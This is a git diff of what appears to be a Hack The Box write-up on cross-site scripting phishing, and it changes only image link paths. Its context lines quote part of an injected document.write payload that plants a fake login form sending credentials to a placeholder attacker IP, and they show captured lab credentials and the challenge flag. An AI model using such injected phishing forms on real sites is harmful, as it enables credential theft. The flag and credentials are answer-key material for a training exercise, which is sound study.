@@ -200,7 +200,7 @@ With everything ready, we can start our PHP server and send the URL that include
 # Question
 ---
 
-![](../images/Pasted%20image%2020250130172026.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250130172026.png)
 
 Nice, let's breakdown this question:
 
@@ -215,7 +215,7 @@ document.write('<h3>Please login to continue</h3><form action=http://OUR_TUN0_IP
 
 We can see the following:
 
-![](../images/Pasted%20image%2020250130172409.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250130172409.png)
 
 We could erase the `Image URL` section from above but since this is just a challenge, let's keep it like that.
 
@@ -272,7 +272,7 @@ Credentials are: `admin`:`p1zd0nt57341myp455`
 
 We can log in at `/login.php`:
 
-![](../images/Pasted%20image%2020250130174015.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250130174015.png)
 
 Got the flag: `HTB{r3f13c73d_cr3d5_84ck_2_m3}`
 
